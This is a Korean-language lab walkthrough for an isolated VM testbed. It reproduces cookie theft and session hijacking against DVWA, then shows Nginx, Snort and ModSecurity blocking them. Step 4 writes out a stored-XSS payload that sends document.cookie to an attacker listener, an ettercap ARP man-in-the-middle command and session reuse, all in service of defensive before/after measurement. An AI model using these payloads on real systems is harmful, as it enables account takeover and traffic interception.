# 통합 실습 가이드 (Walkthrough)

이 문서는 흩어져 있는 단계별 가이드를 **실제로 손으로 따라 할 수 있는 순서**로
재배열한 것입니다. 각 블록은 어느 VM에서 무엇을 하는지와, 다음 단계로 넘어가기 전에
확인할 **체크포인트**를 함께 적었습니다.

> ⚠️ **교육용 격리 실습 전용.** 모든 공격 재현은 VMware VMnet8 격리망
> 안에서만 수행합니다. 실제 사내망·공용망에서는 절대 실행하지 않습니다.

핵심 원칙 하나: 공격은 반드시 **"방어 OFF → 방어 ON" 두 번** 돌려 비교합니다.
그래야 이 랩의 목적(방어 전/후 정량 비교)이 성립합니다.

## 전체 흐름

```
준비   : 4개 VM + 격리망
단계1  : DVWA 타겟(.20) 세우기
단계2  : 게이트웨이(.10) — Nginx 프록시 + Snort + ModSecurity
단계3  : 공격자(.5) / 피해자(.30) 준비
단계4  : 방어 OFF 상태로 공격 재현 (성공 확인 = 베이스라인)
단계5  : 방어 ON 상태로 다시 공격 (차단/탐지 확인)
단계6  : 지표·로그 수집해서 비교표 채우기
```

| 노드 | OS | IP | 역할 |
| --- | --- | --- | --- |
| 공격자 | Kali | 192.168.10.5 | 내부자 / 침투자 |
| 게이트웨이 | Ubuntu 22.04 | 192.168.10.10 | Nginx + Snort + ModSecurity |
| 타겟(DVWA) | Ubuntu 22.04 | 192.168.10.20 | 사내 그룹웨어 |
| 피해자 | Windows 10 | 192.168.10.30 | 관리자 PC(세션 생성) |

---

## 0단계 — 격리망 + VM 4대 준비

> 작업 위치: **VMware 호스트(내 PC)** → 각 VM
> 상세: [01-network-vmnet8.md](01-network-vmnet8.md)

1. VMware → Edit → **Virtual Network Editor**(관리자 권한) 열기
2. **VMnet8** 선택 → 모드 **Host-only** 권장(외부 완전 분리).
   패키지 설치 동안만 NAT를 썼다가 끝나면 Host-only로 되돌립니다.
3. Subnet IP `192.168.10.0`, Mask `255.255.255.0`
4. **"Use local DHCP service" 체크 해제**(IP 고정해야 룰·ARP표가 일관됨)
5. 각 VM → Settings → Network Adapter → **Custom: VMnet8**

Ubuntu 쪽 고정 IP(`/etc/netplan/01-netcfg.yaml`, 노드마다 `addresses`만 변경):

```yaml
network:
  version: 2
  ethernets:
    ens33:
      dhcp4: no
      addresses: [192.168.10.20/24]   # 노드별로 변경
      nameservers:
        addresses: [8.8.8.8]
```

```bash
sudo netplan apply
ip -4 addr show ens33
```

**✅ 체크포인트:** 아무 노드에서 `ping -c2 192.168.10.20` 등 서로 다 되고,
Host-only면 `ping 8.8.8.8`은 실패해야 정상.

---

## 1단계 — DVWA 타겟 서버 (.20)

> 작업 위치: **타겟 VM (Ubuntu, 192.168.10.20)**
> 상세: [02-dvwa-target.md](02-dvwa-target.md) · 스크립트: [../scripts/01-setup-dvwa.sh](../scripts/01-setup-dvwa.sh)

자동 설치 스크립트를 사용합니다(LAMP → DB `dvwa`/`p@ssw0rd` → DVWA 배포 → PHP 설정).

```bash
# 타겟 VM에서 (레포를 복사해둔 상태)
sudo bash scripts/01-setup-dvwa.sh
```

끝나면 **수동 초기화**:

1. 브라우저에서 `http://192.168.10.20/dvwa/setup.php` → **Create / Reset Database**
2. `admin / password`로 로그인
3. **DVWA Security → Low**(서버측 검증 없는 상태 재현)
4. **XSS (Stored)** 메뉴의 Guestbook 페이지가 뜨는지 확인

**✅ 체크포인트:** DVWA 로그인되고 Guestbook이 보이면 OK.

> ⚠️ 피해자·공격자는 타겟(.20)에 **직접 접속하지 않습니다.** 다음 단계의
> 게이트웨이(.10)를 거쳐 접속해야 ModSecurity/Snort가 트래픽을 봅니다.

---

## 2단계 — 게이트웨이 (.10): Nginx 프록시 + Snort + ModSecurity

> 작업 위치: **게이트웨이 VM (Ubuntu, 192.168.10.10)**

이 노드가 랩의 심장입니다. 세 덩어리로 나눠 구성합니다.

### 2-A. Nginx 리버스 프록시

`http://192.168.10.10/`로 들어온 요청을 타겟(.20)으로 넘겨야, 피해자 트래픽이
ModSecurity 검사를 거쳐 전달됩니다.

```nginx
# /etc/nginx/sites-available/gateway (예시)
server {
    listen 80;
    location / {
        proxy_pass http://192.168.10.20/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

**✅ 체크포인트:** 다른 노드 브라우저에서 `http://192.168.10.10/dvwa/`로 DVWA가 뜬다.

### 2-B. Snort 3 NIDS

> 상세: [03-snort-nids.md](03-snort-nids.md) · 룰: [../snort/local.rules](../snort/local.rules)
> · 스크립트: [../scripts/02-run-snort.sh](../scripts/02-run-snort.sh)

```bash
sudo apt install -y snort3 || sudo apt install -y snort
snort -V
```

`snort.lua` 네트워크 변수 — 내부자 모델이라 **양방향 검사**가 포인트:

```
HOME_NET = '192.168.10.0/24'
EXTERNAL_NET = 'any'
```

실행(공격 재현 때 켜두고 경보 관찰):

```bash
sudo bash scripts/02-run-snort.sh ens33
```

### 2-C. ModSecurity v3 WAF + 세션 하드닝

> 상세: [04-modsecurity-waf.md](04-modsecurity-waf.md) · 룰: [../modsecurity/custom-rules.conf](../modsecurity/custom-rules.conf)

```bash
sudo apt install -y nginx libmodsecurity3 libmodsecurity-dev
cd /etc/nginx && sudo git clone https://github.com/coreruleset/coreruleset.git crs
sudo cp crs/crs-setup.conf.example crs/crs-setup.conf
sudo sed -i 's/SecRuleEngine .*/SecRuleEngine On/' /etc/nginx/modsec/modsecurity.conf
```

- XSS 차단은 **CRS 941xxx**가 담당(커스텀 룰에서 중복 작성 금지)
- 커스텀 룰은 응답 본문의 `document.cookie` 반영만 로깅
- **세션 하드닝**은 5단계(방어 ON)에서 켭니다. 위치만 기억:

```nginx
proxy_cookie_flags ~ httponly samesite=strict;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
```

**✅ 체크포인트:** `SecRuleEngine On` 상태에서 `<script>`를 넣어보면 **403**이 뜬다.

---

## 3단계 — 공격자(.5) / 피해자(.30) 준비

> 상세: [02-dvwa-target.md](02-dvwa-target.md) 하단

### 공격자 Kali (.5)

도구 버전 확인 후 C2 수신기 띄워두기:

```bash
ettercap --version
tshark --version
python3 -c "import scapy; print(scapy.__version__)"

python3 -m http.server 8000     # 유출 쿠키를 받을 C2 엔드포인트
```

### 피해자 Win10 (.30)

1. 브라우저로 `http://192.168.10.10/dvwa/` 접속 → **admin으로 로그인**(관리자 세션 생성)
2. 세션 유지한 채 Guestbook 페이지 열어두기
3. 방화벽 프로파일을 **사설망**으로(ARP 응답 받도록, 격리망 전용)

**✅ 체크포인트:** 피해자가 로그인된 상태 = 탈취할 세션 쿠키(PHPSESSID)가 존재.
세션이 없으면 탈취할 것도 없습니다.

---

## 4단계 — 방어 OFF 상태로 공격 재현 (베이스라인)

> 상세: [05-attack-verification.md](05-attack-verification.md)
> 게이트웨이에서 `SecRuleEngine Off`(또는 DetectionOnly). **Snort는 켜두어
> "탐지는 되는지"는 관찰합니다.**

**STEP 1 — Stored XSS 주입** (공격자가 Guestbook에 저장):

```html
<script>new Image().src='http://192.168.10.5:8000/log?c='+document.cookie</script>
```

→ 방어 OFF면 DB에 그대로 저장됨.

**STEP 2 — 쿠키 유출**: 피해자(관리자)가 Guestbook을 열면 스크립트 실행 →
쿠키가 공격자 `http.server:8000` 로그에 찍힘.
→ Snort 룰 ①(`sid:1000001`, document.cookie) 경보 확인.

**STEP 3 — ARP MitM**:

```bash
sudo ettercap -T -i eth0 -M arp:remote /192.168.10.30// /192.168.10.10//
```

→ Wireshark로 세션 패킷·TCP SEQ/ACK 관찰. Snort 룰 ②(RST flood) 확인.

**STEP 4 — 세션 재사용**: 탈취한 PHPSESSID를 공격자 브라우저에 주입 → 관리자로 재접속.
→ 방어 OFF면 **세션 하이재킹 성공, 관리자 권한 획득.**

**✅ 체크포인트:** 공격자 C2 로그에 PHPSESSID가 찍히고, 그 쿠키로 관리자 접속 성공.
= "공격이 실제로 통한다"는 베이스라인 확보.

---

## 5단계 — 방어 ON 상태로 다시 공격

게이트웨이에서 방어를 전부 켜고 **똑같은 STEP 1~4를 반복**합니다.

- `SecRuleEngine On` + 세션 하드닝(`proxy_cookie_flags ... httponly`, CSP) 적용
- **STEP 1 재시도:** XSS 주입 요청이 CRS 941xxx로 **403 Forbidden** →
  `/var/log/modsec_audit.log`에 룰 ID 남는지 확인
- **STEP 2 (하드닝 검증):** HttpOnly 적용 후 `document.cookie`가 빈 값 →
  C2 로그에 PHPSESSID **안 찍힘**
- **STEP 4:** 유출된 쿠키가 없으니 **재사용할 세션도 없음.** SameSite까지 걸면 재사용 더 제한.

**✅ 체크포인트:** 같은 공격이 (a) WAF에서 403으로 막히거나, (b) 막혀도 쿠키가
HttpOnly라 유출 자체가 실패. OFF와 비교해 "방어가 작동한다"를 입증.

---

## 6단계 — 지표 수집 & 비교표 작성

> 상세: [06-metrics-logs.md](06-metrics-logs.md)

로그 수집:

```bash
sudo tshark -i ens33 -Y 'http contains "document.cookie"' -w /tmp/xss.pcap
cat /var/log/snort/alert_fast.txt
sudo tail -f /var/log/modsec_audit.log
```

정상 트래픽 10,000건을 통과시켜 **FP(오탐)**를 측정하고
Precision/Recall/F1을 계산합니다.

- Precision = TP / (TP + FP)
- Recall = TP / (TP + FN)
- F1 = 2·P·R / (P + R)

[06-metrics-logs.md](06-metrics-logs.md)의 빈 표를 **실측값**으로 채웁니다
(방어 미적용 / WAF 단일 / NIDS+WAF+하드닝 3열 비교). ISO/IEC 25010의
보안성·신뢰성 관점으로 매핑해 보고서에 정리합니다.

---

## 자주 걸리는 지점

- **2-A Nginx 리버스 프록시**가 제대로 안 잡히면 ModSecurity가 트래픽을 아예
  못 봅니다. 가장 먼저 `http://192.168.10.10/dvwa/` 접근부터 확인하세요.
- **Snort 룰 ③**(URI의 PHPSESSID)은 실제 유출 페이로드(`?c='+document.cookie`)
  형태와 안 맞을 수 있습니다. 4단계에서 경보가 안 뜨면 이 룰을 손봐야 합니다.
- 공격 OFF/ON을 **같은 절차로** 돌려야 비교표가 의미를 가집니다. 중간에 설정을
  섞어 바꾸지 말고, 한 바퀴씩 깔끔하게 돌리세요.
